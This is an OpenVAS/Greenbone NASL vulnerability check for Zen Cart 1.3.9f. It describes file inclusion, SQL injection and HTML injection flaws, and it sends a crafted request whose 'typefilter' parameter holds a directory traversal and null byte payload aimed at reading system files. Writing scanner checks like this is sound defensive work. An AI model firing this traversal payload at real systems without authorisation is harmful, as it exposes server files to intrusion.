# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:zen-cart:zen_cart";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100840");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2010-10-04 14:08:22 +0200 (Mon, 04 Oct 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Zen Cart <= 1.3.9f Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_zencart_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("zen_cart/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Zen Cart is prone to multiple input validation vulnerabilities
  because it fails to adequately sanitize user-supplied input. These vulnerabilities include local
  file include, SQL injection, and HTML injection issues.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Exploiting these issues can allow attacker-supplied HTML and
  script code to run in the context of the affected browser, allowing attackers to steal
  cookie-based authentication credentials, view local files within the context of the webserver,
  compromise the application, access or modify data, or exploit latent vulnerabilities in the
  underlying database. Other attacks may also be possible.");

  script_tag(name:"affected", value:"Zen Cart v1.3.9f is vulnerable, other versions may also be
  affected.");

  script_tag(name:"solution", value:"Updates are available. Please see the reference for more details.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/43628");
  script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4967.php");
  script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4966.php");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {
  url = dir + "/index.php?typefilter=" + crap(data: "..%2f", length: 9 * 5) + files[file] + "%00";

  if (http_vuln_check(port: port, url: url,pattern: file)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
